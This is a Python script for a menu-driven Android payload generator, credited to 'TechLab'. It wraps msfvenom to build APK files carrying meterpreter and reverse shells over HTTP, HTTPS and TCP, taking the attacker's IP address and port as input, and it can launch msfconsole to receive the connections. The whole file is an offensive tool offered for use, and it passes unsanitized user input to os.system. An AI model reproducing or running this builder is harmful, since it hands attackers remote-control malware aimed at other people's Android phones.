import os
from colorama import Fore, Back, Style
COLORS = {\
"black":"\u001b[30;1m",
"red": "\u001b[31;1m",
"green":"\u001b[32m",
"yellow":"\u001b[33;1m",
"blue":"\u001b[34;1m",
"magenta":"\u001b[35m",
"cyan": "\u001b[36m",
"white":"\u001b[37m",
}
def colorText(text):
    for color in COLORS:
        text = text.replace("[[" + color + "]]", COLORS[color])
    return text

f = open(".Title","r")
ascii = "".join(f.readlines())
print(Style.BRIGHT + colorText(ascii))
description= """
				     [*] Copyright @ TechLab [*]

  			      [*] www.aungthumyint-mm.blogspot.com [*]

			              Release Date [15-11-2020]
"""
print(Style.BRIGHT + Fore.YELLOW + description)
print(Style.RESET_ALL)

path = "/root/Payload-Creator"
try:
    os.mkdir(path)
except FileExistsError:
    pass

create_payload = """
	[01] android/meterpreter/reverse_http		[08] android/shell/reverse_https
	[02] android/meterpreter/reverse_https		[09] android/shell/reverse_tcp
	[03] android/meterpreter/reverse_tcp		[10] Metasploit 
	[04] android/meterpreter_reverse_http		[11] About
	[05] android/meterpreter_reverse_https		[12] Exit
	[06] android/meterpreter_reverse_tcp
	[07] android/shell/reverse_http
"""
print(Style.BRIGHT + Fore.CYAN +  create_payload)
print(Style.RESET_ALL)

def run(runfile):
	with open(runfile,"r") as rnf:
		exec(rnf.read())

try:
	options = str(input("[*] Choose Your Input Options [*] : "))
	print("\n")

### Option One ###
	if options==str(1):
		print(Fore.YELLOW + "[*] Using android/meterpreter/reverse_http")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 01.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/meterpreter/reverse_http LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/01.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/meterpreter/reverse_http LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Two ###
	elif options==str(2):
		print(Fore.YELLOW + "[*] Using android/meterpreter/reverse_https")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 02.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/meterpreter/reverse_https LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/02.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/meterpreter/reverse_https LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Three ###
	elif options==str(3):
		print(Fore.YELLOW + "[*] Using android/meterpreter/reverse_tcp")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 03.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/03.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Four ###
	elif options==str(4):
		print(Fore.YELLOW + "[*] Using android/meterpreter_reverse_http")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 04.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/meterpreter_reverse_http LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/04.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/meterpreter_reverse_http LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Five ###
	elif options==str(5):
		print(Fore.YELLOW + "[*] Using android/meterpreter_reverse_https")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 05.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/meterpreter_reverse_https LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/05.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/meterpreter_reverse_https LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Six ###
	elif options==str(6):
		print(Fore.YELLOW + "[*] Using android/meterpreter_reverse_tcp")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 06.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/meterpreter_reverse_tcp LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/06.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/meterpreter_reverse_tcp LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Seven ###
	elif options==str(7):
		print(Fore.YELLOW + "[*] Using android/shell/reverse_http")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 07.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/shell/reverse_http LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/07.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/shell/reverse_http LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Eight ###
	elif options==str(8):
		print(Fore.YELLOW + "[*] Using android/shell/reverse_https")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 08.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/shell/reverse_https LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/08.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/shell/reverse_https LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Nine ###
	elif options==str(9):
		print(Fore.YELLOW + "[*] Using android/shell/reverse_tcp")
		ip  = input("\nEnter Your IP Address (Eg : 127.0.0.1) : ")
		port = input("\nEnter Your Listen Port (Eg : 1234,3333,4444) : ")
		output = input("\nOutput File Name (Eg : Payload) : ")
		if output==str(""):
			os.system("clear")
			print(Style.BRIGHT + Fore.RED + """

	##############################
	& Output File Name Is 09.apk &
	##############################
""")
			print(Style.RESET_ALL)
			os.system("msfvenom -p android/shell/reverse_tcp LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/09.apk")
			run('Run.py')
		else:
			os.system("clear && msfvenom -p android/shell/reverse_tcp LHOST=" + ip +  " LPORT=" + port + " -o /root/Payload-Creator/" + output + ".apk")
			run('Run.py')
			print(Style.RESET_ALL)

### Option Ten ###
	elif options==str(10):
		f = open(".Help","r")
		ascii = "".join(f.readlines())
		print(Style.BRIGHT + colorText(ascii))
		print(Style.RESET_ALL)
		os.system("msfconsole -q")
		os.system("clear")
		run('Run.py')

### Option Eleven ###
	elif options==str(11):
		os.system("clear")
		f = open(".About","r")
		ascii = "".join(f.readlines())
		print(Style.BRIGHT + colorText(ascii))
		run('Run.py')

### Option Twelve ###
	elif options==str(12):
		os.system("clear")
		f = open(".Exit","r")
		ascii = "".join(f.readlines())
		print(Style.BRIGHT + colorText(ascii))
	else:
		os.system("clear")
		print(Style.BRIGHT + Fore.RED + """
	###############################
	* Invalid Options ! Try Again *
	###############################
	""")
		run('Run.py')

except ValueError:
	print()
